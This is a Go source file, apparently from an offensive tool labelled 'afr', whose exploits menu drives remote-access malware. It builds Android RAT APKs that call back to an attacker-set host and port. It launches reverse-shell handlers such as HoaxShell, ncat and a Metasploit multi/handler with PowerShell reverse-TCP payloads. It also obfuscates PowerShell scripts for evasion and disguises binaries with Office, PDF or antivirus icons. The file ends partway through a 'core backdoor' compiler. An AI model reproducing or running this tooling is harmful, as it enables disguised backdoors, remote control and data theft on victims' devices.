//John 3:16

package exploits

import (
    "os"
    "fmt"
    "time"
    "utils"
    "menus"
    "banners"
    "strconv"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "scriptures"
    "path/filepath"
    "encoding/base64"
)


var(
    Function string
)

type stringMatcher struct {
    names  []string
    action func()
}

func ExploitsPentest() {
    for {
        fmt.Printf("%s%s%safr%s%s exploits(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Endc, bcolors.Underline, bcolors.Bold, subprocess.Version, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        utils.Scanner.Scan()
        Input := strings.TrimSpace(utils.Scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(strings.ToLower(Input))
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{

        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "cls", "clear", "cls screen", "clear screen", "screen cls", "screen clear"}, utils.ClearScreen},

        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutorials},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        {[]string{"info"}, menus.HelpInfoExploits},
        {[]string{"m", "menu"}, menus.MenuFour},
        {[]string{"option", "options", "show option", "show options"}, func() {menus.ExploitsOptions(utils.OuterIcon, utils.InnerIcon, utils.LHost, utils.LPort, utils.HPort, utils.Script, utils.BuildName, Function, utils.Proxies, utils.ExploitsLogs, utils.Listener, utils.Protocol, utils.Obfuscator)}},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListExploitsFunctions},
        {[]string{"icon", "icons", "show icon", "show icons", "list icon", "list icons"}, menus.ListIcons},

        {[]string{"listener", "listeners", "show listener", "show listeners", "list listener", "list listeners"}, menus.ListListenersFunctions},
        {[]string{"obf", "obfu", "obfuscator", "obfuscators", "show obfuscator", "show obfuscators", "list obfuscator", "list obfuscators"}, menus.ListObfscatorsFunctions},

        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run androrat", "use androrat", "exec androrat", "start androrat", "launch androrat", "exploit androrat", "execute androrat"}, func() {MalwarePenFunctions("androrat"); menus.MenuFour()}},
        {[]string{"? 1", "info 1", "help 1", "androrat", "info androrat", "help androrat"}, func() {menus.HelpInfoAndroRat(utils.LHost, utils.LPort, utils.HPort, utils.BuildName, utils.ExploitsLogs, utils.Proxies, utils.Protocol)}},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run teardroid", "use teardroid", "exec teardroid", "start teardroid", "launch teardroid", "exploit teardroid", "execute teardroid"}, func() {MalwarePenFunctions("teardroid")}},
        {[]string{"? 2", "info 2", "help 2", "teardroid", "info teardroid", "help teardroid"}, func() {menus.HelpInfoTearDroid(utils.LHost, utils.LPort, utils.HPort, utils.BuildName, utils.ExploitsLogs, utils.Proxies, utils.Protocol)}},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run blackjack", "use blackjack", "exec blackjack", "start blackjack", "launch blackjack", "exploit blackjack", "execute blackjack"}, func() {MalwarePenFunctions("blackjack"); menus.MenuFour()}},
        {[]string{"? 3", "info 3", "help 3", "blackjack", "info blackjack", "help blackjack"}, func() {menus.HelpInfoBlackJack(utils.LHost, utils.LPort, utils.HPort, utils.Proxies, utils.Protocol)}},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run hoaxshell", "use hoaxshell", "exec hoaxshell", "start hoaxshell", "launch hoaxshell", "exploit hoaxshell", "execute hoaxshell"}, func() {MalwarePenFunctions("hoaxshell"); menus.MenuFour()}},
        {[]string{"? 4", "info 4", "help 4", "hoaxshell", "info hoaxshell", "help hoaxshell"}, func() {menus.HelpInfoHoaxShell(utils.LHost, utils.LPort, utils.Protocol)}},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run shellz", "use shellz", "exec shellz", "start shellz", "launch shellz", "exploit shellz", "execute shellz"}, func() {MalwarePenFunctions("shellz"); menus.MenuFour()}},
        {[]string{"? 5", "info 5", "help 5", "shellz", "info shellz", "help shellz"}, func() {menus.HelpInfoShellz(utils.LHost, utils.LPort, utils.Protocol)}},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run ghost", "use ghost", "exec ghost", "start ghost", "launch ghost", "exploit ghost", "execute ghost"}, func() {MalwarePenFunctions("ghost"); menus.MenuFour()}},
        {[]string{"? 6", "info 6", "help 6", "ghost", "info ghost", "help ghost"}, func() {menus.HelpInfoGhost(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ExploitsLogs, utils.Listener)}},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run chameleon", "use chameleon", "exec chameleon", "start chameleon", "launch chameleon", "exploit chameleon", "execute chameleon"}, func() {MalwarePenFunctions("chameleon"); menus.MenuFour()}},
        {[]string{"? 7", "info 7", "help 7", "chameleon", "info chameleon", "help chameleon"}, func() {menus.HelpInfoChameleon(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ExploitsLogs, utils.Listener)}},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run regsniper", "use regsniper", "exec regsniper", "start regsniper", "launch regsniper", "exploit regsniper", "execute regsniper"}, func() {MalwarePenFunctions("regsniper"); menus.MenuFour()}},
        {[]string{"? 8", "info 8", "help 8", "regsniper", "info regsniper", "help regsniper"}, func() {menus.HelpInfoRegSniper(utils.OuterIcon, utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ExploitsLogs, utils.Listener)}},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run lithaldll", "use lithaldll", "exec lithaldll", "start lithaldll", "launch lithaldll", "exploit lithaldll", "execute lithaldll"}, func() {MalwarePenFunctions("lithaldll"); menus.MenuFour()}},
        {[]string{"? 9", "info 9", "help 8", "lithaldll", "info lithaldll", "help lithaldll"}, func() {menus.HelpInfoLithalDll(utils.OuterIcon, utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ExploitsLogs, utils.Listener)}},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarrators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], strings.Join(parts[2:], " ")

    setValues := map[string]*string{

      "func": &Function,
      "funcs": &Function,
      "module": &Function,
      "ssid": &utils.Ssid,
      "iface": &utils.IFace,
      "mode": &utils.NeMode,
      "function": &Function,
      "lhost": &utils.LHost,
      "lport": &utils.LPort,
      "hport": &utils.HPort,
      "rhost": &utils.RHost,
      "rhosts": &utils.RHost,
      "functions": &Function,
      "target": &utils.RHost,
      "distro": &utils.Distro,
      "targets": &utils.RHost,
      "proxy": &utils.Proxies,
      "script": &utils.Script,
      "name": &utils.BeefName,
      "interface": &utils.IFace,
      "build": &utils.BuildName,
      "proxies": &utils.Proxies,
      "passwd": &utils.BeefPass,
      "gateway": &utils.GateWay,
      "fakedns": &utils.FakeDns,
      "spoofer": &utils.Spoofer,
      "toolsdir": &utils.ToolsDir,
      "ddosmode": &utils.DDosMode,
      "recondir": &utils.ReconDir,
      "password": &utils.PassWord,
      "protocol": &utils.Protocol,
      "listener": &utils.Listener,
      "venvname": &utils.VenvName,
      "wordlist": &utils.WordsList,
      "listeners": &utils.Listener,
      "innericon": &utils.InnerIcon,
      "outericon": &utils.OuterIcon,
      "buildname": &utils.BuildName,
      "output": &utils.ExploitsLogs,
      "obfuscator": &utils.Obfuscator,
      "outputlog": &utils.ExploitsLogs,
      "outputlogs": &utils.ExploitsLogs,
    }

    validKeys := make([]string, 0, len(setValues))
    for k := range setValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s%s%s -> %s\n", bcolors.Cyan, strings.ToUpper(key), bcolors.Endc, value)
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 1

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }

        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }
        fmt.Println()
        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)
    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 1

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

      "func": &Function,
      "funcs": &Function,
      "module": &Function,
      "ssid": &utils.Ssid,
      "iface": &utils.IFace,
      "mode": &utils.NeMode,
      "function": &Function,
      "lhost": &utils.LHost,
      "lport": &utils.LPort,
      "hport": &utils.HPort,
      "rhost": &utils.RHost,
      "rhosts": &utils.RHost,
      "functions": &Function,
      "target": &utils.RHost,
      "distro": &utils.Distro,
      "targets": &utils.RHost,
      "proxy": &utils.Proxies,
      "script": &utils.Script,
      "name": &utils.BeefName,
      "interface": &utils.IFace,
      "build": &utils.BuildName,
      "proxies": &utils.Proxies,
      "passwd": &utils.BeefPass,
      "gateway": &utils.GateWay,
      "fakedns": &utils.FakeDns,
      "spoofer": &utils.Spoofer,
      "toolsdir": &utils.ToolsDir,
      "ddosmode": &utils.DDosMode,
      "recondir": &utils.ReconDir,
      "password": &utils.PassWord,
      "protocol": &utils.Protocol,
      "listener": &utils.Listener,
      "venvname": &utils.VenvName,
      "wordlist": &utils.WordsList,
      "listeners": &utils.Listener,
      "innericon": &utils.InnerIcon,
      "outericon": &utils.OuterIcon,
      "buildname": &utils.BuildName,
      "output": &utils.ExploitsLogs,
      "obfuscator": &utils.Obfuscator,
      "outputlog": &utils.ExploitsLogs,
      "outputlogs": &utils.ExploitsLogs,
    }

    validKeys := make([]string, 0, len(unsetValues))
    for k := range unsetValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = utils.DefaultValues[key]
        fmt.Printf("%s -> %s\n", strings.ToUpper(key), "Null")
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 1

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }

        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Println()
        }

        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 1

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Println()
    }
}

func MalwarePenFunctions(Function string, args ...interface{}) {
    os.MkdirAll(utils.GeneratorDir, os.ModePerm)

    if utils.Proxies != "" {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.ExMode,
            IFACE: utils.IFace,
            LPORT: utils.LPort,
            HPORT: utils.HPort,
            //RHOST: utils.RHost,
            LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            SCRIPT: utils.Script,
            OUTPUTLOGS: utils.ExploitsLogs,
            PROXIES: utils.Proxies,
            FUNCTION: Function,
            //RECONDIR: utils.ReconDir,
            LISTENER: utils.Listener,
            PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            INNERICON: utils.InnerIcon,
            OUTERICON: utils.OuterIcon,
            BUILDNAME: utils.BuildName,
            OBFUSCATOR: utils.Obfuscator,
        }, true, true)

        if err := utils.SetProxy(utils.Proxies); err != nil {
            //
        }
    } else {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.ExMode,
            IFACE: utils.IFace,
            LPORT: utils.LPort,
            HPORT: utils.HPort,
            //RHOST: utils.RHost,
            LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            SCRIPT: utils.Script,
            OUTPUTLOGS: utils.ExploitsLogs,
            FUNCTION: Function,
            //RECONDIR: utils.ReconDir,
            LISTENER: utils.Listener,
            PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            INNERICON: utils.InnerIcon,
            OUTERICON: utils.OuterIcon,
            BUILDNAME: utils.BuildName,
            OBFUSCATOR: utils.Obfuscator,
        }, true, true)
    }

    commands := map[string]func(){
        "androrat":   func() {AndroRat(utils.LHost, utils.LPort, utils.BuildName, utils.ToolsDir, utils.GeneratorDir)},
        "teardroid":  func() {TearDroid(utils.BuildName, utils.ToolsDir, utils.GeneratorDir)},
        "blackjack":  func() {BlackJack(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ToolsDir)},
        "hoaxshell":  func() {HoaxShell(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ToolsDir)},
        "shellz":     func() {Shellz()},
        "ghost":      func() {Obfuscators("ghost", utils.BuildName, utils.ToolsDir, utils.Script, utils.GeneratorDir)},
        "chameleon":  func() {Obfuscators("chameleon", utils.BuildName, utils.ToolsDir, utils.Script, utils.GeneratorDir)},
        "regsniper":  func() {RegSniper(utils.ToolsDir, utils.LPort, utils.HPort, utils.Protocol, utils.Script, utils.OuterIcon, utils.Listener, utils.LHost, utils.GeneratorDir, utils.ExploitsLogs, utils.BuildName)},
        "lithaldll":  func() {LithalDll(utils.ToolsDir, utils.LPort, utils.HPort, utils.Protocol, utils.Script, utils.OuterIcon, utils.Listener, utils.LHost, utils.GeneratorDir, utils.ExploitsLogs, utils.BuildName)},
        "ncat":       func() {Ncat(utils.LPort, utils.Protocol)},
        "havoc":      func() {Havoc()},
        "seashell":   func() {SeaShell()},
        "meterpeter": func() {MeterPeter()},
        "powerjoker": func() {PowerJoker(utils.LHost, utils.LPort, utils.ToolsDir)},
        "metasploit": func() {Metasploit(utils.LHost, utils.LPort, utils.Protocol)},

        "1":  func() {AndroRat(utils.LHost, utils.LPort, utils.BuildName, utils.ToolsDir, utils.GeneratorDir)},
        "2":  func() {TearDroid(utils.BuildName, utils.ToolsDir, utils.GeneratorDir)},
        "3":  func() {BlackJack(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ToolsDir)},
        "4":  func() {HoaxShell(utils.LHost, utils.LPort, utils.HPort, utils.Protocol, utils.ToolsDir)},
        "5":  func() {Shellz()},
        "6":  func() {Obfuscators("ghost", utils.BuildName, utils.ToolsDir, utils.Script, utils.GeneratorDir)},
        "7":  func() {Obfuscators("chameleon", utils.BuildName, utils.ToolsDir, utils.Script, utils.GeneratorDir)},
        "8":  func() {RegSniper(utils.ToolsDir, utils.LPort, utils.HPort, utils.Protocol, utils.Script, utils.OuterIcon, utils.Listener, utils.LHost, utils.GeneratorDir, utils.ExploitsLogs, utils.BuildName)},
        "9":  func() {LithalDll(utils.ToolsDir, utils.LPort, utils.HPort, utils.Protocol, utils.Script, utils.OuterIcon, utils.Listener, utils.LHost, utils.GeneratorDir, utils.ExploitsLogs, utils.BuildName)},
        "10": func() {Ncat(utils.LPort, utils.Protocol)},
        "11": func() {Havoc()},
        "12": func() {SeaShell()},
        "13": func() {MeterPeter()},
        "14": func() {PowerJoker(utils.LHost, utils.LPort, utils.ToolsDir)},
        "15": func() {Metasploit(utils.LHost, utils.LPort, utils.Protocol)},
    }

    textCommands := []string{"ncat", "havoc", "ghost", "chameleon", "shellz", "seashell", "androrat", "teardroid", "blackjack", "hoaxshell", "meterpeter", "powerjoker", "metasploit", "regsniper", "lithaldll"}

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("%s[!] %sNumber %s%d%s is invalid. Valid numbers are 1-10.\n", bcolors.Yellow, bcolors.Endc, bcolors.Red, num, bcolors.Endc)
        menus.ListExploitsFunctions()
        return
    }

    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListExploitsFunctions()
}

func executeFunction() {
    if Function == "" {
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    MalwarePenFunctions(Function, utils.LHost, utils.Protocol, utils.LPort, utils.HPort, utils.BuildName, utils.Listener)
}


func Havoc() {
    subprocess.Run(`havoc client & havoc server -d -v`)
}

func Shellz() {
    subprocess.Run(`cd %s/shells/; bash shells.sh`, utils.WListeners)
}

func SeaShell() {
    subprocess.Run(`cd %s/seashell/; %s sea_shell.py`, utils.WListeners, utils.VenvPython)
}

func MeterPeter() {
    subprocess.Run(`cd %s/meterpeter/; pwsh meterpeter.ps1`, utils.WListeners)
}

func TearDroid(BuildName, ToolsDir, GeneratorDir string) {
    subprocess.Run(`cd %s/teardroid/; %s Teardroid.py -b %s`, utils.AListeners, utils.VenvPython, utils.BuildName)
}

func AndroRat(LHost, LPort, BuildName, ToolsDir, GeneratorDir string) {
    subprocess.Run("cd %s/androrat/; %s androrat.py --build -i %s -p %s -o %s.apk", utils.AListeners, utils.VenvPython, utils.LHost, utils.LPort, filepath.Join(utils.GeneratorDir, utils.BuildName))
    subprocess.Run("cd %s/androrat/; %s androrat.py --shell -i %s -p %s", utils.AListeners, utils.VenvPython, utils.LHost, utils.LPort)
}

func Obfuscators(Obfuscator, BuildName, ObfusCatorsDir, Script, GeneratorDir string) {
    if Script == "" {
        fmt.Printf("%s[!] %s SCRIPT location not set. Use %s'show options' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    Delay := 0 * time.Millisecond
    utils.ReadFileLetterByLetter(bcolors.BrightGreen, Script, Delay)
    fmt.Printf("\n%s%s[*] %sLoading the above script ... \n%s%s[*] %sObfuscating the script ...\n" , bcolors.Bold, bcolors.Green, bcolors.Endc, bcolors.Bold, bcolors.Blue, bcolors.Endc)

    switch strings.ToLower(Obfuscator) {
    case "ghost":
        subprocess.Run("cd %s/Invoke-PSObfuscation/; pwsh -c 'Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s.ps1'", utils.ObfusCatorsDir, Script, filepath.Join(utils.GeneratorDir, utils.BuildName))
    case "chameleon":
        subprocess.Run("cd %s/chameleon/; %s chameleon.py -f -n -c --verbose %s -o %s.ps1", utils.ObfusCatorsDir, utils.VenvPython, Script, filepath.Join(utils.GeneratorDir, utils.BuildName))
        return
    case "vulkan":
        subprocess.Run("cd %s/vulkan/; go run vulkan.go --all --verbose -f %s -o %s.ps1", utils.ObfusCatorsDir, Script, filepath.Join(utils.GeneratorDir, utils.BuildName))
        return
    case "psobf":
        subprocess.Run("cd %s/psobf/; go run psobf.go -level 5 -i %s -o %s.ps1", utils.ObfusCatorsDir, Script, filepath.Join(utils.GeneratorDir, utils.BuildName))
        return
    default:
        fmt.Printf("%s[!] %sError: Invalid %stype. Try %s'show stealth' %sfor help\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, utils.Obfuscator, bcolors.Endc)
    }

    fmt.Printf("\n%s%s[*] %sDone Obfuscating ...\n%s%s[+] %sObfuscation results below ...\n", bcolors.Bold, bcolors.Green, bcolors.Endc, bcolors.Bold, bcolors.Blue, bcolors.Endc)
    utils.ReadFileLetterByLetter(bcolors.BrightGreen, filepath.Join(utils.GeneratorDir, utils.BuildName) + ".ps1", Delay)
}

func PowerJoker(LHost, LPort, WListeners string) {
    subprocess.Run(`cd %s/joker/; %s joker.py -l %s -p %s`, utils.WListeners, utils.VenvPython, utils.LHost, utils.LPort)
    return
}

func HoaxShell(LHost, LPort, HPort, Protocol, WListeners string) {
    switch strings.ToLower(utils.Protocol) {
    case "tcp":
        subprocess.Run("cd %s/hoaxshell/; %s hoaxshell.py -s %s -p %s", utils.WListeners, utils.VenvPython, utils.LHost, utils.LPort)
        return
    case "http", "https":
        subprocess.Run("cd %s/hoaxshell/; %s hoaxshell.py -s %s -p %s -c %s -k %s", utils.WListeners, utils.VenvPython, utils.LHost, utils.LPort, utils.CertPath, utils.KeyPath)
        return
    default:
        fmt.Printf("%s[!] %sError: Invalid utils.Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, utils.Obfuscator, bcolors.Endc)
    }
}

func BlackJack(LHost, LPort, HPort, Protocol, WListeners string) {
    switch strings.ToLower(utils.Protocol) {
    case "tcp":
        subprocess.Run("cd %s/blackjack/; %s blackjack.py -i -n %s\n", utils.WListeners, utils.VenvPython, utils.LPort)
        return
    case "http", "https":
        subprocess.Run("cd %s/blackjack/; %s blackjack.py -i -x %s -n %s -c %s -k %s", utils.WListeners, utils.VenvPython, utils.LPort, utils.HPort, utils.CertPath, utils.KeyPath)
        return
    default:
        fmt.Printf("%s[!] %sError: Invalid utils.Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, utils.Obfuscator, bcolors.Endc)
    }
}

func Ncat(LPort, Protocol string) {
    Tools := []string{"rlwrap", "ncat"}
    for _, Tool := range Tools {
        if err := utils.LocateTool(Tool); err != nil {
            return
        }
    }

    switch strings.ToLower(utils.Protocol) {
    case "tcp":
        subprocess.Run("rlwrap ncat -lnvp %s", utils.LPort)
        return
    case "http", "https":
        subprocess.Run("rlwrap ncat --ssl --ssl-cert %s --ssl-key %s -lnvp %s", utils.CertPath, utils.KeyPath, utils.LPort)
        return
    default:
        fmt.Printf("%s[!] %sError: Invalid utils.Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, utils.Obfuscator, bcolors.Endc)
    }
}

func Metasploit(LHost, LPort, Protocol string) {
    if err := utils.LocateTool("msfconsole"); err != nil {
        return
    }
    switch strings.ToLower(utils.Protocol) {
    case "tcp":
        subprocess.Run("msfconsole -x 'use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'", utils.LHost, utils.LPort)
        return
    case "http", "https":
        subprocess.Run("msfconsole -x 'use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j'", utils.LHost, utils.LPort)
        return
    default:
        fmt.Printf("%s[!] %sError: Invalid utils.Protocol type. Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, utils.Obfuscator, bcolors.Endc)
    }
}

func IconChanger(UserIcon, ToolsDir, GeneratorDir string) {
    validIcons := map[string]bool{
        "lync": true, "excel": true, "access": true, "autorun": true, "pdf": true, "project": true, "publisher": true, "powerpoint": true, "redrat": true, "vlc": true, "word": true, "visio": true, "kaspersky": true, "defender": true,
    }

    icon := strings.ToLower(UserIcon)
    if !validIcons[icon] {
        fmt.Printf("%s[!] %sError: Invalid ICON '%s' type. Try %s'show icons' %sfor help\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, UserIcon, bcolors.Endc)
        return
    }

    IconSource := filepath.Join(utils.IconsDir, icon + ".png")
    IconDestination := filepath.Join(utils.WinresInit, "icon.png")
    utils.Copy(IconSource, IconDestination)
    subprocess.Run("cd %s; ./go-winres make --in %s/winres.json", utils.WinresDir, utils.WinresInit)
    subprocess.Run("mv %s/*.syso %s; mv %s/icon.png %s", utils.WinresDir, utils.GeneratorDir, utils.WinresInit, utils.GeneratorDir)
    os.WriteFile(filepath.Join(utils.GeneratorDir, "go.mod"), []byte("module main"), 0644)
}

func ShikataGanai(ToolsDir, LPort, HPort, Protocol, Script, Listener, LHost, GeneratorDir string) {
    spiner := utils.New(
        utils.WithStyle("dots"),
        utils.WithEffect("plain"),
        utils.WithText("%s%s[*] %sCompiling core backdoor ...", bcolors.Bold, bcolors.Green, bcolors.Endc),
        utils.WithClearOnStop(false),
        utils.WithCursorHidden(true),
        utils.WithSpeed(90 * time.Millisecond),
    )

    fmt.Printf("%s%s[*] %sConfiguring LPORT, LHOST and PROTOCOL ...\n", bcolors.Bold, bcolors.Green, bcolors.Endc)
    GoTemplate := "go_payloads/raw_backdoor.go"
    PshellTemplate := "ncat_payloads/powershell_reverse_%s.ps1"

    UersProtocol := strings.ToLower(utils.Protocol)
    if UersProtocol != "tcp" && UersProtocol != "http" && UersProtocol != "https" {
        fmt.Printf("%s[!] %sError: Invalid utils.Protocol type. %s Try %s'show protocols' %sfor help\n", bcolors.BrightRed, bcolors.BrightGreen, utils.Protocol, bcolors.Endc)
        return
    }

